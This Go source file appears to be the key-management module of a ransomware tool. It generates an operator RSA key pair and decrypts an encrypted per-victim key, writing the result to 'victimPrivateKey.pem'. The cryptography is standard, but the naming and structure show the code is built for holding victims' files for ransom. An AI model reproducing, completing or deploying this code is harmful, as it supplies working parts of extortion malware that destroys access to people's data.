package key

import (
	"log"
	"os"
	"path/filepath"

	"github.com/smile10/innocent/crypto"
	"github.com/smile10/innocent/fs"
)

const PUBLIC_KEY_NAME = "publickey.pem"
const PRIVATE_KEY_NAME = "privatekey.pem"

func CreateKeys(path string, keysize int) error {

	rsaKeypair, err := crypto.NewRandomRSAKeyPair(keysize)
	if err != nil {
		return err
	}

	absolutePath, err := filepath.Abs(path)
	if err != nil {
		return err
	}

	log.Println("Generated random keys at", absolutePath)
	log.Printf("Hide your %s key!", PRIVATE_KEY_NAME)

	privatePemContent := crypto.ExportRSAPrivateKeyToPem(rsaKeypair.PrivateKey)
	publicPemContent, err := crypto.ExportRSAPublicKeyToPem(rsaKeypair.PublicKey)

	if err != nil {
		return err
	}

	fs.WriteStringToFile(filepath.Join(path, PRIVATE_KEY_NAME), privatePemContent)
	fs.WriteStringToFile(filepath.Join(path, PUBLIC_KEY_NAME), publicPemContent)

	return nil
}

func DecryptPrivateKey(privateKey string, encryptedKey string) error {
	absPrivateKeyPath, err := filepath.Abs(privateKey)
	if err != nil {
		return err
	}

	absEncryptedKeyPath, err := filepath.Abs(encryptedKey)
	if err != nil {
		return err
	}

	privateKeyPem, err := fs.ReadStringFileContent(absPrivateKeyPath)
	if err != nil {
		return err
	}

	privKey, err := crypto.ImportRSAPrivateKeyFromPem(privateKeyPem)
	if err != nil {
		return err
	}

	ciphertext, err := os.ReadFile(absEncryptedKeyPath)
	if err != nil {
		return err
	}

	plaintext, err := crypto.RSADecrypt(ciphertext, privKey)
	if err != nil {
		return err
	}

	fs.WriteStringToFile("victimPrivateKey.pem", string(plaintext))
	return nil
}
